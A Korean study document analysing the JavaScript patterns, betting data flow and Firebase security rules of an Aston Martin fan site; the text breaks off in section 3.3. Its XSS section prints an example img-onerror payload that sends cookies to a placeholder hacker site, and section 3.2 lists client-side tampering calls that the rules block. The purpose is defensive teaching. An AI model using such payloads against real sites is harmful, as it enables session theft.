# Aston Martin Fan Page - 실무 패턴 & 아키텍처 완전 분석

---

## 1. 발견된 실무 패턴 전체 목록

### 1.1 IIFE 패턴 (즉시 실행 함수 표현식)

**한 줄 설명:** 코드를 캡슐(알약처럼 감싸는 것)로 감싸서 다른 코드와 충돌을 방지하는 패턴

**내 코드에서 사용된 위치:** `js/attendance.js:5-453`, `js/errorHandler.js`, `js/script.js`

```javascript
// js/attendance.js:5-15
(function() {           // ← 여기서 함수를 만들고
    'use strict';       // ← 엄격 모드 (실수 방지)

    const elements = {  // ← 이 변수는 이 함수 안에서만 존재
        btn: null,
        streak: null,
        calendar: null
    };

    function init() {
        // 초기화 로직
    }

    // ... 모든 코드 ...

})();                   // ← 여기서 즉시 실행!
```

**한 줄씩 해설:**
- `(function() {` : 이름 없는 함수를 만들어요. 마치 "임시 방"을 하나 만드는 거예요.
- `'use strict';` : "나 실수하면 바로 알려줘!"라고 브라우저에게 요청하는 거예요.
- `const elements = {...}` : 이 변수는 이 "방" 안에서만 존재해요. 밖에서는 접근 불가!
- `})();` : 마지막 `()`가 "만들자마자 바로 실행해!"라는 의미예요.

**이 패턴이 없으면 뭐가 터지나요?**
```javascript
// attendance.js
var btn = document.getElementById('attendanceBtn');

// script.js (다른 파일)
var btn = document.getElementById('submitBtn');  // 💥 충돌! 첫 번째 btn이 덮어씌워짐!
```
전역 변수(모든 곳에서 접근 가능한 변수)가 충돌해서 출석 버튼이 작동 안 해요.

**면접 답변 예시:**
> "IIFE는 즉시 실행 함수 표현식으로, 전역 네임스페이스 오염을 방지합니다. 함수 스코프를 이용해 변수를 캡슐화하고, 모듈처럼 독립적인 코드 블록을 만들 수 있습니다."

---

### 1.2 싱글톤 패턴 (Singleton)

**한 줄 설명:** 프로그램 전체에서 딱 하나만 존재하는 객체를 만드는 패턴

**내 코드에서 사용된 위치:** `js/errorHandler.js:560-575`

```javascript
// js/errorHandler.js:560-575
const ErrorHandler = {  // ← 객체 리터럴로 싱글톤 구현
    ERROR_TYPES: {
        NETWORK: 'network',
        SERVER: 'server',
        UNAUTHORIZED: 'unauthorized'
        // ...
    },

    handleError: function(error, options = {}) {
        // 에러 처리 로직
    },

    safeFetch: async function(url, options = {}) {
        // 안전한 fetch 로직
    }
};

window.ErrorHandler = ErrorHandler;  // ← 전역에 하나만 노출
```

**비유로 설명:**
싱글톤은 "회사에 사장님이 한 명만 있어야 하는 것"과 같아요. 사장님이 두 명이면 명령이 충돌하겠죠? ErrorHandler도 마찬가지로, 에러 처리 담당자는 한 명만 있어야 일관된 에러 메시지를 보여줄 수 있어요.

**이 패턴이 없으면 뭐가 터지나요?**
```javascript
// 싱글톤 없이 각 파일에서 따로 만들면...
// attendance.js
const errorHandler1 = { showError: () => alert('에러1') };

// betting.js
const errorHandler2 = { showError: () => console.log('에러2') };

// 💥 어떤 건 alert, 어떤 건 console.log... 사용자 경험 엉망!
```

**면접 답변 예시:**
> "싱글톤 패턴은 클래스의 인스턴스를 하나만 생성하고 전역 접근점을 제공합니다. 저는 ErrorHandler를 싱글톤으로 구현해서 앱 전체에서 일관된 에러 처리 UI를 제공했습니다."

---

### 1.3 옵저버 패턴 (Observer)

**한 줄 설명:** "뭔가 바뀌면 알려줘!"라고 등록해두고, 변화가 생기면 자동으로 알림받는 패턴

**내 코드에서 사용된 위치:** `js/auth.js:129-146`, `js/headToHeadBet.js:250-276`

```javascript
// js/auth.js:129-146
auth.onAuthStateChanged((user) => {  // ← "로그인 상태 바뀌면 알려줘!"
    updateUIForUser(user);           // ← 바뀌면 이 함수가 자동 실행
    hideLoadingOverlay();

    if (user) {
        console.log('로그인 상태:', user.displayName);
        localStorage.setItem('wasLoggedIn', 'true');
        tokenManager.startAutoRefresh();  // ← 토큰 자동 갱신 시작
    } else {
        console.log('로그아웃 상태');
        localStorage.removeItem('wasLoggedIn');
        tokenManager.stopAutoRefresh();   // ← 토큰 갱신 중지
    }
});
```

```javascript
// js/headToHeadBet.js:250-276
h2hLiveOddsState.unsubscribe = db.collection('headToHeadBets')
    .where('raceId', '==', h2hState.raceId)
    .where('status', '==', 'pending')
    .onSnapshot((snapshot) => {           // ← "베팅 데이터 바뀌면 알려줘!"
        calculateH2HLiveOdds(snapshot);   // ← 자동으로 배당률 재계산
        updateH2HLiveOddsDisplay();       // ← 화면 업데이트
    }, (error) => {
        console.error('실시간 배당률 리스너 오류:', error);
    });
```

**비유로 설명:**
유튜브 구독 알림과 같아요! "이 채널에서 새 영상 올리면 알려줘!"라고 구독 버튼을 누르면, 영상이 올라올 때마다 알림이 오잖아요. `onAuthStateChanged`는 "로그인/로그아웃 채널"을 구독하는 거고, `onSnapshot`은 "베팅 데이터 채널"을 구독하는 거예요.

**이 패턴이 없으면 뭐가 터지나요?**
```javascript
// 옵저버 없이 구현하면...
setInterval(() => {
    const user = auth.currentUser;  // 1초마다 계속 확인
    updateUI(user);
}, 1000);

// 💥 문제점:
// 1. 배터리 낭비 (계속 확인)
// 2. 로그인 직후 1초까지 기다려야 UI 변경
// 3. 서버 요청 폭증 (베팅 데이터 계속 조회)
```

**면접 답변 예시:**
> "옵저버 패턴은 객체의 상태 변화를 구독자들에게 자동으로 알려주는 패턴입니다. Firebase의 onAuthStateChanged와 onSnapshot이 대표적인 예로, 실시간 동기화와 이벤트 기반 아키텍처를 구현할 때 사용했습니다."

---

### 1.4 캐싱 패턴 (Caching)

**한 줄 설명:** 한 번 가져온 데이터를 임시 저장해서, 같은 요청이 오면 저장된 걸 바로 돌려주는 패턴

**내 코드에서 사용된 위치:** `js/utils.js:9-92`, `js/f1api.js:19-74`

```javascript
// js/utils.js:9-35
const apiCache = {
    data: new Map(),              // ← 캐시 저장소 (금고)
    defaultTTL: 5 * 60 * 1000     // ← 유효기간: 5분 (밀리초)
};

async function cachedFetch(url, options = {}, ttl = apiCache.defaultTTL) {
    const cacheKey = getCacheKey(url, options);  // ← 캐시 이름표 만들기
    const cached = apiCache.data.get(cacheKey);  // ← 금고에서 찾기

    // 캐시가 있고, 아직 유효하면 (5분 안 지났으면)
    if (cached && (Date.now() - cached.timestamp) < ttl) {
        console.log(`[Cache] 캐시 사용: ${url}`);
        return new Response(JSON.stringify(cached.data));  // ← 금고에서 꺼내줌
    }

    // 캐시 없거나 만료됨 → 실제로 서버에 요청
    const response = await fetch(url, options);

    if (response.ok) {
        const data = await response.clone().json();  // ← 복사본 만들기
        apiCache.data.set(cacheKey, {
            data,
            timestamp: Date.now()  // ← 저장 시간 기록
        });
    }

    return response;
}
```

```javascript
// js/f1api.js:19-40 - 3단계 캐싱
const OPENF1_API = {
    cache: {},           // ← 1. API 응답 캐시
    meetingKeyCache: {}, // ← 2. 미팅 키 캐시
    sessionKeyCache: {}  // ← 3. 세션 키 캐시
};
```

**비유로 설명:**
편의점 냉장고와 같아요! 손님이 콜라를 달라고 하면, 매번 공장에서 가져오는 게 아니라 냉장고(캐시)에서 바로 꺼내주죠. 근데 콜라가 5분 넘게 있으면(TTL 만료) 신선도가 떨어지니까 새로 가져와요.

**이 패턴이 없으면 뭐가 터지나요?**
```javascript
// 캐싱 없이...
// 사용자가 페이지를 새로고침할 때마다:
await fetch('/api/news');     // 서버 요청 1
await fetch('/api/news');     // 서버 요청 2 (같은 데이터인데 또 요청)
await fetch('/api/news');     // 서버 요청 3

// 💥 문제점:
// 1. 서버 비용 폭증 (AWS/GCP 요금 청구서 공포)
// 2. 사용자 대기 시간 증가
// 3. 서버 과부하로 다운될 수 있음
```

**면접 답변 예시:**
> "캐싱은 반복적인 API 호출을 줄여 성능을 최적화하는 패턴입니다. TTL(Time To Live) 기반으로 캐시 만료를 관리하고, 메모리 캐시(Map)를 사용해 동일 요청에 대한 응답 시간을 밀리초 단위로 줄였습니다."

---

### 1.5 디바운싱 & 쓰로틀링

**한 줄 설명:**
- **디바운싱**: 연속된 이벤트 중 마지막 것만 실행
- **쓰로틀링**: 일정 시간 간격으로만 실행 허용

**내 코드에서 사용된 위치:** `js/script.js:150-181`

```javascript
// js/script.js:150-181 - 쓰로틀링
let countdownInterval = null;  // ← 인터벌 ID 저장

function startCountdown() {
    if (countdownInterval) return;  // ← 이미 실행 중이면 무시 (중복 방지)

    updateCountdown();  // ← 즉시 한 번 실행
    countdownInterval = setInterval(updateCountdown, 1000);  // ← 1초마다만 실행
}

function stopCountdown() {
    if (countdownInterval) {
        clearInterval(countdownInterval);  // ← 인터벌 중지
        countdownInterval = null;
    }
}

// 페이지 가시성 API로 쓰로틀링
document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        stopCountdown();  // ← 탭이 백그라운드면 중지 (배터리 절약)
    } else {
        startCountdown(); // ← 탭이 활성화되면 재시작
    }
});
```

**비유로 설명:**
- **쓰로틀링**: 엘리베이터 문이 닫히는 것과 같아요. 아무리 버튼을 연타해도 문은 일정 속도로만 닫히죠.
- **디바운싱**: 검색창에 "아스톤마틴"을 입력할 때, 매 글자마다 검색하지 않고 입력을 멈춘 후에 검색하는 거예요.

**이 패턴이 없으면 뭐가 터지나요?**
```javascript
// 쓰로틀링 없이...
window.addEventListener('scroll', () => {
    updateUI();  // 스크롤할 때마다 실행
});

// 💥 1초에 수십~수백 번 실행됨!
// → 브라우저 멈춤, 배터리 급속 방전
```

---

### 1.6 이벤트 위임 (Event Delegation)

**한 줄 설명:** 100개 버튼에 각각 이벤트를 다는 대신, 부모 하나에만 달아서 처리하는 패턴

**내 코드에서 사용된 위치:** `js/paddock.js:176-222`

```javascript
// js/paddock.js:176-190
function createPostRow(p) {
    const card = document.createElement('article');
    card.className = 'post-card';
    card.onclick = () => openPostDetail(p.id);  // ← 카드 전체에 클릭 이벤트

    // 카드 안에 여러 요소가 있지만...
    card.innerHTML = `
        <div class="post-vote">...</div>      <!-- 클릭해도 -->
        <div class="post-content">            <!-- 여기를 클릭해도 -->
            <h3 class="post-title">...</h3>   <!-- 여기를 클릭해도 -->
        </div>
    `;
    // ← 모두 부모(card)의 onclick으로 처리됨!

    return card;
}
```

**비유로 설명:**
회사 대표번호와 같아요! 각 직원한테 직통번호를 주는 대신, 대표번호 하나로 전화가 오면 내선으로 연결해주는 거죠. 게시글이 100개여도 이벤트 리스너는 부모 하나만 있으면 돼요.

**이 패턴이 없으면 뭐가 터지나요?**
```javascript
// 이벤트 위임 없이...
posts.forEach(post => {
    document.getElementById(`post-${post.id}`).addEventListener('click', handler);
});

// 💥 문제점:
// 1. 게시글 100개 = 이벤트 리스너 100개 (메모리 낭비)
// 2. 동적으로 추가된 게시글은 이벤트 없음!
// 3. 무한 스크롤 시 리스너가 계속 쌓임
```

---

### 1.7 에러 핸들링 패턴 (Error Classification)

**한 줄 설명:** 에러를 종류별로 분류하고, 각 종류에 맞는 처리를 하는 패턴

**내 코드에서 사용된 위치:** `js/errorHandler.js:45-117`

```javascript
// js/errorHandler.js:45-90
function classifyError(error) {
    // 1. HTTP 상태 코드로 분류
    if (typeof error === 'number') {
        if (error === 401 || error === 403) return 'unauthorized';  // 인증 문제
        if (error === 404) return 'not_found';                       // 없는 페이지
        if (error >= 500) return 'server';                           // 서버 문제
    }

    // 2. Error 객체의 메시지로 분류
    if (error instanceof Error) {
        const message = error.message.toLowerCase();

        if (message.includes('network')) return 'network';   // 인터넷 끊김
        if (message.includes('timeout')) return 'timeout';   // 시간 초과
    }

    return 'unknown';  // 모르는 에러
}

// 에러 종류별 다른 UI 표시
function handleError(error, options = {}) {
    const errorType = classifyError(error);

    switch (errorType) {
        case 'unauthorized':
            showGlobalAlert('로그인이 필요합니다.', 'warning');
            break;
        case 'network':
            showToast('인터넷 연결을 확인해주세요.', 'error');
            break;
        case 'server':
            showToast('서버에 문제가 생겼습니다.', 'error');
            break;
    }
}
```

**비유로 설명:**
병원 응급실 분류(트리아지)와 같아요! 환자가 오면 증상을 보고 "이 사람은 심장내과", "이 사람은 정형외과"로 보내죠. 에러도 종류를 파악해서 적절한 처리를 해요.

---

### 1.8 타임아웃 패턴 (Timeout with AbortController)

**한 줄 설명:** 요청이 너무 오래 걸리면 강제로 취소하는 패턴

**내 코드에서 사용된 위치:** `js/headToHeadBet.js:50-68`

```javascript
// js/headToHeadBet.js:50-68
async function h2hFetchWithTimeout(url, options, timeoutMs = 10000) {
    const controller = new AbortController();  // ← 취소 리모컨 생성
    const timeoutId = setTimeout(() => {
        controller.abort();  // ← 10초 후 자동으로 취소 버튼 누름
    }, timeoutMs);

    try {
        const response = await fetch(url, {
            ...options,
            signal: controller.signal  // ← 리모컨 연결
        });
        clearTimeout(timeoutId);  // ← 성공하면 타이머 해제
        return response;
    } catch (error) {
        clearTimeout(timeoutId);
        if (error.name === 'AbortError') {
            throw new Error('요청 시간이 초과되었습니다.');
        }
        throw error;
    }
}
```

**비유로 설명:**
라면 타이머와 같아요! 물이 3분 안에 안 끓으면 "뭔가 잘못됐다"고 판단하고 가스레인지를 끄는 거죠. 서버 응답이 10초 안에 안 오면 "서버가 죽었나보다"하고 요청을 포기해요.

**이 패턴이 없으면 뭐가 터지나요?**
```javascript
// 타임아웃 없이...
await fetch('/api/bet');  // 서버가 응답 안 하면 영원히 대기

// 💥 사용자는 무한 로딩 화면만 봄
// 💥 "멈춘 건가? 새로고침 해야 하나?" 혼란
```

---

### 1.9 지수 백오프 재시도 (Exponential Backoff)

**한 줄 설명:** 실패하면 1초 후 재시도, 또 실패하면 2초, 4초... 점점 간격을 늘려가며 재시도하는 패턴

**내 코드에서 사용된 위치:** `js/errorHandler.js:189-239`

```javascript
// js/errorHandler.js:189-239
async function safeFetch(url, options = {}) {
    const retries = options.retries || 1;
    let lastError;

    for (let attempt = 0; attempt <= retries; attempt++) {
        try {
            const response = await fetch(url, options);
            if (response.ok) return response;
            throw new Error(`HTTP ${response.status}`);
        } catch (error) {
            lastError = error;

            // 4xx 에러는 재시도해도 소용없음 (클라이언트 잘못)
            if (error.status >= 400 && error.status < 500) {
                break;
            }

            // 재시도 전 대기 (1초 → 2초 → 4초...)
            if (attempt < retries) {
                const waitTime = Math.pow(2, attempt) * 1000;  // ← 지수 백오프
                await new Promise(r => setTimeout(r, waitTime));
            }
        }
    }

    throw lastError;
}
```

**비유로 설명:**
친구한테 전화할 때와 같아요! 첫 번째 안 받으면 1분 후 다시, 또 안 받으면 2분 후, 5분 후... 계속 바로바로 전화하면 친구 짜증나잖아요. 서버도 마찬가지로, 바로 재시도하면 서버에 부담을 줘요.

---

### 1.10 XSS 방지 패턴 (HTML Escape)

**한 줄 설명:** 사용자가 입력한 위험한 코드를 무력화하는 패턴

**내 코드에서 사용된 위치:** `js/utils.js:131-136`, `js/paddock.js:195-202`

```javascript
// js/utils.js:131-136
function escapeHtml(str) {
    if (!str) return '';
    const div = document.createElement('div');
    div.textContent = str;   // ← textContent는 HTML을 해석 안 함!
    return div.innerHTML;    // ← 안전하게 변환된 문자열 반환
}

// 사용 예시 (paddock.js:195-202)
card.innerHTML = `
    <h3 class="post-title">${escapeHtml(p.title)}</h3>
`;
```

**비유로 설명:**
공항 보안검색과 같아요! 승객(사용자 입력)이 가져온 짐(텍스트)에서 위험물(악성 스크립트)을 제거하고 안전한 것만 통과시키는 거죠.

**이 패턴이 없으면 뭐가 터지나요?**
```javascript
// escapeHtml 없이...
const title = '<script>alert("해킹!")</script>';
element.innerHTML = title;  // 💥 스크립트가 실제로 실행됨!

// 해커가 이렇게 입력하면:
// <img src=x onerror="document.location='http://해커사이트.com?cookie='+document.cookie">
// 💥 사용자의 쿠키(로그인 정보)가 해커에게 전송됨!
```

---

### 1.11 서버 시간 동기화 패턴

**한 줄 설명:** 클라이언트 시계가 조작되어도 서버 시간을 기준으로 마감을 판단하는 패턴

**내 코드에서 사용된 위치:** `js/podiumBet.js:139-166`

```javascript
// js/podiumBet.js:139-166
let serverTimeOffset = 0;  // ← 서버와 내 컴퓨터의 시간 차이

async function syncServerTime() {
    const clientBefore = Date.now();           // ← 요청 보내기 전 시간
    const response = await fetch('/api/server-time');
    const clientAfter = Date.now();            // ← 응답 받은 후 시간
    const data = await response.json();

    // 네트워크 지연 보정 (왕복 시간의 절반)
    const networkDelay = (clientAfter - clientBefore) / 2;
    const serverTime = data.timestamp;
    const clientTime = clientBefore + networkDelay;

    serverTimeOffset = serverTime - clientTime;  // ← 시간 차이 저장
    console.log(`서버 시간 동기화: offset=${serverTimeOffset}ms`);
}

// 서버 시간 기준으로 현재 시간 계산
function getServerTime() {
    return Date.now() + serverTimeOffset;
}

// 베팅 마감 검증
if (getServerTime() >= raceDate) {
    showAlert('베팅이 마감되었습니다.', 'error');
    return;  // ← 클라이언트 시계 조작해도 통과 불가!
}
```

**비유로 설명:**
수능 시험장 시계와 같아요! 학생이 손목시계를 10분 늦춰도, 감독관은 시험장 시계(서버 시간)를 기준으로 "시험 종료!"를 외치죠.

---

### 1.12 상수 동결 패턴 (Object.freeze)

**한 줄 설명:** 중요한 설정값을 아무도 못 바꾸게 얼려버리는 패턴

**내 코드에서 사용된 위치:** `js/constants.js:185-199`

```javascript
// js/constants.js:185-199
const BETTING_CONFIG = {
    MIN_BET: 1,
    MAX_BET: 1000,
    PODIUM_POSITIONS: 3
};

Object.freeze(BETTING_CONFIG);  // ← 이제 아무도 못 바꿈!

// 개발자 도구에서 이렇게 시도해도...
BETTING_CONFIG.MAX_BET = 999999;  // ← 무시됨!
console.log(BETTING_CONFIG.MAX_BET);  // 여전히 1000
```

**비유로 설명:**
헌법과 같아요! 일반 법률은 국회에서 바꿀 수 있지만, 헌법은 아무나 못 바꾸죠. 베팅 한도 같은 중요한 설정은 "헌법"처럼 보호해야 해요.

---

### 1.13 DOM 캐싱 패턴

**한 줄 설명:** 자주 쓰는 HTML 요소를 변수에 저장해두고 재사용하는 패턴

**내 코드에서 사용된 위치:** `js/attendance.js:11-28`

```javascript
// js/attendance.js:11-28
const elements = {
    btn: null,
    streak: null,
    calendar: null
};

function cacheElements() {
    elements.btn = document.getElementById('attendanceBtn');      // ← 한 번만 찾기
    elements.streak = document.getElementById('attendanceStreak');
    elements.calendar = document.getElementById('attendanceCalendar');
}

// 이후에는 저장된 걸 사용
function updateUI() {
    elements.btn.disabled = true;  // ← 매번 getElementById 안 해도 됨!
}
```

**비유로 설명:**
자주 가는 식당 번호를 저장해두는 것과 같아요! 매번 "○○동 맛집" 검색하는 대신, 연락처에서 바로 전화하는 거죠.

**이 패턴이 없으면 뭐가 터지나요?**
```javascript
// DOM 캐싱 없이...
function update() {
    document.getElementById('btn').disabled = true;   // DOM 탐색 1
    document.getElementById('btn').textContent = '완료'; // DOM 탐색 2
    document.getElementById('btn').style.color = 'green'; // DOM 탐색 3
}

// 💥 같은 요소를 3번이나 찾음 → 성능 저하
```

---

### 1.14 DocumentFragment 패턴

**한 줄 설명:** 여러 요소를 메모리에서 조립한 후, 한 번에 화면에 붙이는 패턴

**내 코드에서 사용된 위치:** `js/paddock.js:158-165`

```javascript
// js/paddock.js:158-165
const fragment = document.createDocumentFragment();  // ← 임시 조립 공간

snap.forEach(doc => {
    const p = { id: doc.id, ...doc.data() };
    state.posts.push(p);
    fragment.appendChild(createPostRow(p));  // ← 조립 공간에 추가 (화면 변화 없음)
});

$('postsList').appendChild(fragment);  // ← 한 번에 화면에 붙임!
```

**비유로 설명:**
이사할 때 짐 싸는 것과 같아요! 물건 하나씩 새 집으로 옮기는 게 아니라, 박스(Fragment)에 다 담은 후 한 번에 옮기는 거죠. 화면 깜빡임(리플로우)을 최소화해요.

---

### 1.15 메모리 누수 방지 패턴

**한 줄 설명:** 페이지를 떠날 때 사용하던 자원을 정리하는 패턴

**내 코드에서 사용된 위치:** `js/auth.js:239-242`, `js/headToHeadBet.js:242-246`

```javascript
// js/auth.js:239-242
window.addEventListener('beforeunload', () => {
    tokenManager.stopAutoRefresh();  // ← 토큰 갱신 인터벌 정리
});

// js/headToHeadBet.js:242-246
if (h2hLiveOddsState.unsubscribe) {
    h2hLiveOddsState.unsubscribe();  // ← Firestore 구독 해제
    h2hLiveOddsState.unsubscribe = null;
}
```

**비유로 설명:**
퇴근할 때 컴퓨터 끄는 것과 같아요! 계속 켜두면 전기세(메모리)가 나가고, 너무 많이 켜두면 정전(브라우저 크래시)이 날 수 있죠.

---

## 2. 전체 데이터 흐름도 (로그인 → 베팅 → 결과 확인)

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        유저 로그인 → 베팅 → 결과 확인 흐름                      │
└─────────────────────────────────────────────────────────────────────────────┘

【1단계: 로그인】
┌──────────┐    ┌─────────────────┐    ┌──────────────────┐
│  유저가   │───▶│  js/auth.js     │───▶│  Firebase Auth   │
│ 구글 버튼 │    │ signInWithGoogle│    │  (구글 인증서버)   │
│  클릭    │    │  :23-40         │    │                  │
└──────────┘    └─────────────────┘    └────────┬─────────┘
                                                │
                                                ▼
┌──────────────────────────────────────────────────────────────────┐
│【2단계: 인증 상태 감지】                                            │
│                                                                  │
│  Firebase Auth ──▶ auth.onAuthStateChanged (auth.js:129)         │
│                          │                                       │
│                          ├──▶ updateUIForUser() → 화면에 이름 표시  │
│                          ├──▶ tokenManager.startAutoRefresh()     │
│                          └──▶ localStorage.setItem('wasLoggedIn') │
└──────────────────────────────────────────────────────────────────┘
                                                │
                                                ▼
【3단계: 베팅 페이지 접속】
┌──────────────────────────────────────────────────────────────────┐
│  betting.html 로드                                                │
│       │                                                          │
│       ├──▶ podiumBet.js: initPodiumBetting()                     │
│       │         │                                                │
│       │         ├──▶ syncServerTime() (서버 시간 동기화)           │
│       │         ├──▶ loadNextRace() (다음 레이스 정보)             │
│       │         └──▶ subscribeLiveOdds() (실시간 배당률 구독)       │
│       │                                                          │
│       └──▶ headToHeadBet.js: initH2HBetting()                    │
│                 │                                                │
│                 └──▶ subscribeH2HLiveOdds() (1:1 베팅 구독)        │
└──────────────────────────────────────────────────────────────────┘
                                                │
                                                ▼
【4단계: 드라이버 선택 & 베팅 금액 입력】
┌──────────────────────────────────────────────────────────────────┐
│  유저가 "Alonso" 선택, 100 AMR 입력                                │
│       │                                                          │
│       ├──▶ selectDriver() → podiumState.predictions 업데이트      │
│       │                                                          │
│       ├──▶ calculateOdds() → 배당률 계산                          │
│       │         │                                                │
│       │         └──▶ 전체 베팅 풀에서 내 베팅 비율로 계산            │
│       │                                                          │
│       └──▶ updateBetDisplay() → 화면에 예상 당첨금 표시            │
└──────────────────────────────────────────────────────────────────┘
                                                │
                                                ▼
【5단계: 베팅 제출】
┌──────────────────────────────────────────────────────────────────┐
│  "베팅하기" 버튼 클릭                                               │
│       │                                                          │
│       ▼                                                          │
│  podiumBet.js: placePodiumBet() (또는 headToHeadBet.js)           │
│       │                                                          │
│       ├──[검증 1] getServerTime() >= 마감시간? → "마감됨" 에러      │
│       ├──[검증 2] 베팅 금액 1~1000 범위? → 범위 에러                │
│       ├──[검증 3] 잔액 충분? → 잔액 부족 에러                       │
│       │                                                          │
│       ▼                                                          │
│  user.getIdToken() ──▶ Firebase ID Token 발급                    │
│       │                                                          │
│       ▼                                                          │
│  fetch('/api/bet/podium', {                                      │
│      headers: { 'Authorization': `Bearer ${idToken}` },          │
│      body: { predictions, amount, raceId }                       │
│  })                                                              │
└──────────────────────────────────────────────────────────────────┘
                                                │
                                                ▼
【6단계: 서버 처리】(server.js)
┌──────────────────────────────────────────────────────────────────┐
│  POST /api/bet/podium                                            │
│       │                                                          │
│       ├──[서버 검증 1] verifyIdToken(idToken) → 유효한 토큰?       │
│       ├──[서버 검증 2] 레이스 마감 시간 체크 (서버 시간 기준)         │
│       ├──[서버 검증 3] Firestore에서 유저 잔액 확인                 │
│       │                                                          │
│       ▼                                                          │
│  Firestore Transaction (원자적 처리)                              │
│       │                                                          │
│       ├──▶ users/{uid}.tokens -= betAmount                       │
│       ├──▶ podiumBets.add({ userId, predictions, amount, ... })  │
│       └──▶ tokenHistory.add({ type: 'bet', amount: -100 })       │
│                                                                  │
│       ▼                                                          │
│  Response: { success: true, betId, newBalance }                  │
└──────────────────────────────────────────────────────────────────┘
                                                │
                                                ▼
【7단계: 클라이언트 업데이트】
┌──────────────────────────────────────────────────────────────────┐
│  fetch 응답 수신                                                  │
│       │                                                          │
│       ├──▶ updateTokenDisplay(newBalance) → 잔액 UI 업데이트      │
│       ├──▶ showToast('베팅 완료!', 'success')                     │
│       └──▶ resetBettingForm() → 폼 초기화                         │
│                                                                  │
│  + Firestore onSnapshot 트리거                                    │
│       │                                                          │
│       └──▶ 다른 유저 화면의 실시간 배당률도 자동 업데이트!            │
└──────────────────────────────────────────────────────────────────┘
                                                │
                                                ▼
【8단계: 레이스 종료 후 정산】(관리자가 실행)
┌──────────────────────────────────────────────────────────────────┐
│  server.js: POST /api/admin/settle                               │
│       │                                                          │
│       ├──▶ 실제 레이스 결과 입력 (1위: Alonso, 2위: Stroll...)     │
│       │                                                          │
│       ├──▶ podiumBets에서 해당 레이스 베팅 전부 조회                │
│       │                                                          │
│       ├──▶ 각 베팅 검사:                                          │
│       │         예측 맞음? → 배당률 × 베팅금 지급                   │
│       │         예측 틀림? → 0 AMR                                │
│       │                                                          │
│       ├──▶ users/{uid}.tokens += 당첨금                          │
│       └──▶ podiumBets/{betId}.status = 'settled'                 │
└──────────────────────────────────────────────────────────────────┘
                                                │
                                                ▼
【9단계: 결과 확인】
┌──────────────────────────────────────────────────────────────────┐
│  mypage.js: loadMyBets()                                         │
│       │                                                          │
│       ├──▶ Firestore 쿼리: podiumBets.where('userId', '==', uid) │
│       │                                                          │
│       └──▶ 베팅 내역 표시:                                        │
│             • 레이스: 바레인 GP                                    │
│             • 예측: 1위 Alonso ✅                                  │
│             • 베팅: 100 AMR → 당첨: 250 AMR                        │
└──────────────────────────────────────────────────────────────────┘
```

---

## 3. 보안 관련 구조

### 3.1 인증 토큰 발급 & 전달 흐름

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           Firebase ID Token 흐름                            │
└─────────────────────────────────────────────────────────────────────────────┘

【발급】
┌──────────┐    ┌─────────────┐    ┌──────────────┐
│  유저가   │───▶│  Firebase   │───▶│   구글 서버   │
│ 구글 로그인│    │  Auth SDK   │    │  (OAuth 2.0) │
└──────────┘    └─────────────┘    └──────┬───────┘
                                          │
                    ┌─────────────────────┘
                    ▼
            ┌───────────────────────────────────────┐
            │  Firebase ID Token (JWT)              │
            │  ┌─────────────────────────────────┐  │
            │  │ Header: { alg: "RS256" }        │  │
            │  │ Payload: {                      │  │
            │  │   uid: "abc123",                │  │
            │  │   email: "user@gmail.com",      │  │
            │  │   exp: 1234567890,  ← 만료시간   │  │
            │  │   admin: false      ← 권한      │  │
            │  │ }                               │  │
            │  │ Signature: (구글 비밀키로 서명)   │  │
            │  └─────────────────────────────────┘  │
            └───────────────────────────────────────┘
                              │
【전달】                       ▼
┌──────────────────────────────────────────────────────────────────┐
│  클라이언트 → 서버 요청                                            │
│                                                                  │
│  fetch('/api/bet/podium', {                                      │
│      headers: {                                                  │
│          'Authorization': 'Bearer eyJhbGciOiJS...'  ← ID Token   │
│      },                                                          │
│      body: JSON.stringify({ predictions, amount })               │
│  })                                                              │
└──────────────────────────────────────────────────────────────────┘
                              │
【검증】                       ▼
┌──────────────────────────────────────────────────────────────────┐
│  server.js: verifyIdToken()                                      │
│                                                                  │
│  const decodedToken = await admin.auth().verifyIdToken(token);   │
│                              │                                   │
│                              ├── 서명이 진짜 구글 것인지 확인       │
│                              ├── 만료 시간(exp) 지났는지 확인       │
│                              └── uid, email, admin 권한 추출       │
│                                                                  │
│  if (!decodedToken) {                                            │
│      return res.status(401).json({ error: '인증 실패' });         │
│  }                                                               │
│                                                                  │
│  const userId = decodedToken.uid;  ← 이 유저의 베팅으로 처리       │
└──────────────────────────────────────────────────────────────────┘

【자동 갱신】
┌──────────────────────────────────────────────────────────────────┐
│  auth.js: tokenManager (50분마다 갱신)                            │
│                                                                  │
│  startAutoRefresh() {                                            │
│      this.refreshInterval = setInterval(() => {                  │
│          user.getIdToken(true);  // forceRefresh: true           │
│      }, 50 * 60 * 1000);  // 50분 (만료 10분 전)                   │
│  }                                                               │
│                                                                  │
│  ⚠️ 왜 50분? → ID Token은 1시간 후 만료                           │
│     만료 10분 전에 미리 갱신해서 "세션 끊김" 방지                    │
└──────────────────────────────────────────────────────────────────┘
```

### 3.2 Firebase Security Rules가 막는 요청들

```javascript
// firestore.rules 주요 보안 규칙

// ❌ 막히는 요청 1: 토큰 증가 시도
// 해커가 개발자 도구에서 Firestore 직접 호출
db.collection('users').doc('myUid').update({ tokens: 99999 });
// → 규칙: tokens < resource.data.tokens (차감만 허용)
// → 결과: PERMISSION_DENIED

// ❌ 막히는 요청 2: 다른 사람 베팅 생성
db.collection('podiumBets').add({ userId: '다른사람uid', amount: 1000 });
// → 규칙: isAdmin() 만 생성 가능
// → 클라이언트는 서버 API를 통해서만 베팅 가능

// ❌ 막히는 요청 3: 좋아요 조작
db.collection('posts').doc('postId').update({ likeCount: 9999 });
// → 규칙: likeCount는 ±1만 허용
// → 결과: 9999로 점프 불가

// ❌ 막히는 요청 4: 출석 연속 2회
// 자정 전후로 2번 출석 시도
db.collection('attendance').add({ userId: 'myUid', date: '2026-02-05' });
db.collection('attendance').add({ userId: 'myUid', date: '2026-02-05' });
// → 규칙: lastAttendance + 24시간 경과 필수
// → 결과: 두 번째 출석 DENIED

// ❌ 막히는 요청 5: 레이스 결과 조작
db.collection('races').doc('race1').update({ winner: 'Alonso' });
// → 규칙: allow write: if false;
// → 클라이언트는 절대 수정 불가 (Admin SDK만 가능)
```

### 3.3 코인 조작 방지 구조

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        AMR 코인 조작 방지 다층 방어                           │
└─────────────────────────────────────────────────────────────────────────────┘

【1층 방어: 클라이언트 상수 동결】
┌──────────────────────────────────────────────────────────────────┐
